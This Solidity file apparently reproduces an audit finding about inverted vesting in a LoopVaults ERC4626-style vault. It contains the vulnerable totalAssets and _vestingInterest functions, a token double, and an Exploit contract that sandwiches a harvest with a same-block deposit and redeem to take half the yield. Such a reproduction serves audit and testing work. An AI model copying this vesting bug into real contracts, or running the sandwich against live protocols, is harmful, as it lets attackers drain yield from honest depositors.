// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LoopVaults finding 58543 (H-01):
// "Incorrect vesting interest calculation enables MEV attacks".
//
// Real audited source (the vulnerable functions are reproduced VERBATIM from the
// embedded snippet in the Pashov Audit Group review; the vulnerable line is @>):
//   protocol LoopVaults (security review 2025-04-30, Pashov Audit Group)
//   report   github.com/pashov/audits/blob/master/team/md/LoopVaults-security-review_2025-04-30.md
//   fns      totalAssets() + _vestingInterest()
//
// Root cause: newly harvested interest is supposed to VEST (stay locked) right
// after an update and be released linearly over `vestingDuration`, so that a
// deposit/withdraw sandwiching the harvest cannot capture it. `_vestingInterest()`
// is INVERTED: it returns 0 when `block.timestamp == lastUpdate` (i.e. right after
// the update) and rises linearly to the full amount at `vestingDuration`. So
// `totalAssets() = lastTotalAssets - _vestingInterest()` includes the ENTIRE freshly
// harvested interest immediately after the update. The share price jumps at the
// update instead of drifting up over the vesting window — an MEV bot front-runs the
// harvest with a deposit and back-runs it with a redeem (zero time at risk) and
// steals a pro-rata slice of the yield from the honest long-term holders.
//
// The two vulnerable functions are byte-for-byte the audited source. The
// surrounding ERC4626-style vault (share conversion, deposit/redeem, harvest
// bookkeeping) and the ERC20 asset are faithful minimal doubles — real transfers,
// real pro-rata accounting; the bug emerges from the verbatim code, it is not
// asserted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal base so `totalAssets()` keeps its verbatim `override` specifier.
abstract contract ERC4626VestingBase {
    function totalAssets() public view virtual returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the vault's underlying asset. `mint` is
///      used only to (a) fund actors and (b) deliver harvested yield into the vault
///      (representing the protocol's external strategy earnings) — never to fake the
///      vulnerable accounting, which is driven entirely by the verbatim functions.
contract MiniToken {
    string public name = "Loop Vault Asset";
    string public symbol = "lpUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `totalAssets()` and `_vestingInterest()` are reproduced
// VERBATIM from the audited LoopVaults source. Everything else is a faithful
// minimal ERC4626-style double.
// ─────────────────────────────────────────────────────────────────────────────
contract LoopVault is ERC4626VestingBase {
    MiniToken public asset;

    // ── vault accounting state referenced by the verbatim functions ──
    uint256 public lastTotalAssets; // total assets under management (incl. harvested interest)
    uint256 public lastUpdate;      // timestamp of the last harvest/update
    uint256 public vestingInterest; // interest amount currently being vested
    uint256 public vestingDuration; // linear vesting window

    // ── share bookkeeping ──
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(MiniToken asset_, uint256 vestingDuration_) {
        asset = asset_;
        vestingDuration = vestingDuration_;
        lastUpdate = block.timestamp;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VERBATIM from the audited source (embedded snippet). @> marks the bug line.
    // ─────────────────────────────────────────────────────────────────────────
    function totalAssets() public view override returns (uint256) {
        return lastTotalAssets - _vestingInterest();
    }

    function _vestingInterest() internal view returns (uint256) {
        if (block.timestamp - lastUpdate >= vestingDuration) return 0;

        uint256 __vestingInterest = (block.timestamp - lastUpdate) * vestingInterest / vestingDuration; // @> VULN: inverted vesting — returns 0 right after an update (dt=0) instead of the full interest, so freshly harvested interest is counted in totalAssets() immediately and is MEV-extractable
        return __vestingInterest;
    }

    // ── faithful ERC4626 share <-> asset conversion (uses the verbatim totalAssets) ──
    function _convertToShares(uint256 assets_) internal view returns (uint256) {
        uint256 supply_ = totalSupply;
        return supply_ == 0 ? assets_ : assets_ * supply_ / totalAssets();
    }

    function _convertToAssets(uint256 shares_) internal view returns (uint256) {
        uint256 supply_ = totalSupply;
        return supply_ == 0 ? shares_ : shares_ * totalAssets() / supply_;
    }

    /// @notice Standard ERC4626 view: assets a share amount is currently worth.
    function convertToAssets(uint256 shares_) public view returns (uint256) {
        return _convertToAssets(shares_);
    }

    /// @notice Faithful deposit: mint shares at the current (verbatim) price, pull assets.
    function deposit(uint256 assets_, address receiver_) external returns (uint256 shares_) {
        shares_ = _convertToShares(assets_);
        asset.transferFrom(msg.sender, address(this), assets_);
        lastTotalAssets += assets_;
        totalSupply += shares_;
        balanceOf[receiver_] += shares_;
    }

    /// @notice Faithful redeem: burn shares, pay assets at the current (verbatim) price.
    function redeem(uint256 shares_, address receiver_) external returns (uint256 assets_) {
        assets_ = _convertToAssets(shares_);
        balanceOf[msg.sender] -= shares_;
        totalSupply -= shares_;
        lastTotalAssets -= assets_;
        asset.transfer(receiver_, assets_);
    }

    /// @notice Faithful harvest/update: `interest_` of freshly earned yield has been
    ///         delivered to the vault; recognise it and (re)start the vesting window.
    ///         With correct vesting this makes totalAssets() drift up over
    ///         `vestingDuration`; with the inverted bug it jumps immediately.
    function harvest(uint256 interest_) external {
        lastTotalAssets += interest_;
        vestingInterest = interest_;
        lastUpdate = block.timestamp;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an honest holder is invested while the yield accrues; the
// attacker sandwiches the harvest (deposit just before, redeem just after, same
// block) and walks away with a pro-rata slice of the interest — pure MEV, zero
// time at risk. With correct vesting the same-block redeem would return exactly
// the deposit (no profit).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public asset;
    LoopVault public vault;

    address internal constant VICTIM = address(0xBEEF);

    uint256 internal constant VICTIM_DEPOSIT = 1000e18;   // honest long-term holder
    uint256 internal constant ATTACKER_DEPOSIT = 1000e18; // MEV bot's sandwich size
    uint256 internal constant YIELD = 100e18;             // interest earned before the attacker joined
    uint256 internal constant VESTING_DURATION = 1 days;  // vesting window

    uint256 public depositedByAttacker;
    uint256 public withdrawnByAttacker;
    uint256 public profit;        // net asset profit captured by the attacker
    uint256 public victimShortfall; // interest the victim should have received but lost

    constructor() {
        asset = new MiniToken();                          // child nonce 1 (profit token)
        vault = new LoopVault(asset, VESTING_DURATION);   // child nonce 2 (VULN)
    }

    function run() external {
        // Fund the attacker with the victim's deposit (deposited on their behalf) and
        // the attacker's own sandwich capital. The harvested YIELD is delivered
        // separately (external strategy earnings), NOT out of the attacker's pocket.
        asset.mint(address(this), VICTIM_DEPOSIT + ATTACKER_DEPOSIT);
        asset.approve(address(vault), type(uint256).max);

        // 1) Honest holder is invested while the yield accrues.
        vault.deposit(VICTIM_DEPOSIT, VICTIM);

        // 2) Attacker front-runs the harvest with a deposit at the pre-jump price.
        uint256 attackerBalBefore = asset.balanceOf(address(this)); // == ATTACKER_DEPOSIT
        depositedByAttacker = ATTACKER_DEPOSIT;
        uint256 shares = vault.deposit(ATTACKER_DEPOSIT, address(this));

        // 3) The harvest lands: external yield enters the vault and is recognised.
        asset.mint(address(vault), YIELD);
        vault.harvest(YIELD);

        // 4) Attacker back-runs the harvest with an immediate redeem (same block,
        //    block.timestamp == lastUpdate => _vestingInterest() == 0 => full interest
        //    already counted in totalAssets()).
        vault.redeem(shares, address(this));
        withdrawnByAttacker = asset.balanceOf(address(this)) - attackerBalBefore + ATTACKER_DEPOSIT;

        // net profit = what the attacker holds now minus what it started the sandwich with
        profit = asset.balanceOf(address(this)) - attackerBalBefore;

        // the victim's remaining shares are now worth less than deposit + full yield
        uint256 victimAssets = vault.convertToAssets(vault.balanceOf(VICTIM));
        victimShortfall = (VICTIM_DEPOSIT + YIELD) - victimAssets;

        // HARM: the attacker extracted real yield with zero time at risk (a pure MEV
        // sandwich around the harvest), stealing it from the honest holder. Correct
        // vesting would have returned exactly the deposit (profit == 0).
        require(profit > 0, "no MEV profit (vesting would be correct)");
        require(profit == YIELD / 2, "attacker captured half the yield");
        require(victimShortfall == YIELD / 2, "victim lost half the yield");
    }
}
